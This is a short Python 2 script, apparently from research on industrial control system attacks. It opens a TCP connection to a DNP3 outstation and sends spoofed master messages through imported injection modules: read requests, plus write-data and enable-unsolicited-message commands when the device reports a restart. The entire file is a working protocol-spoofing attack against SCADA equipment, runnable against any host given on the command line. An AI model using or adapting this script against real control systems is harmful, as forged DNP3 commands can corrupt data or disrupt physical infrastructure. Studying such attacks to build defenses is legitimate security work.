#!/usr/bin/python

__author__ = 'Nicholas Rodofile'
import socket
from time import sleep
import sys
from DNP3_Injection import *
from DNP3_spoofable_messages import *

injection = DNP3_Injection_conf(pkt_count="100")
injection.init_spoofing()

#print 'Number of arguments:', len(sys.argv), 'arguments.'
host = "10.192.168.1"
port = 20000                   # The same port as used by the server

try:
    host = sys.argv[1]
except IndexError:
    pass

print "connecting to", host
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
count = 0
configure_dnp3 = {"Read": False, "Write": False, "UNS": False}

def process_master_request(response):
    request = None
    if dnp3.haslayer(DNP3ApplicationIIN):
        if dnp3[DNP3ApplicationIIN].DEVICE_RESTART == SET:
            if response[DNP3ApplicationResponse].FUNC_CODE == 0x82:
                request = injection.victim.spoofer.masquerade([1, 'read_request_class0123'], dnp3)
            if response[DNP3Transport].FIN == UNSET:
                return None
            if response[DNP3Transport].FIN == SET:
                request = injection.victim.spoofer.masquerade([2, 'write_data_objects'], dnp3)
                configure_dnp3["Write"] = True
            if response[DNP3Transport].FIN == SET:
                request = injection.victim.spoofer.masquerade([3, 'enable_spontaneous_msg'], dnp3)
                configure_dnp3["UNS"] = True
        else:
            request = injection.victim.spoofer.masquerade([1, 'read_request'], dnp3)
    return request

data = None
request = None
while count < 100:
    #s.sendall(b'Hello, world '+str(count))
    if data is not None:
        data = s.recv(1024)
        dnp3 = DNP3(data)
        request = process_master_request(dnp3)
    else:
        request = injection.victim.spoofer.masquerade([1, 'read_request_class0123'])
        s.sendall(str(request))
        configure_dnp3["Read"] = True
        data = s.recv(1024)
        dnp3 = DNP3(data)
    if request is not None:
        s.sendall(str(request))
    count += 1
s.close()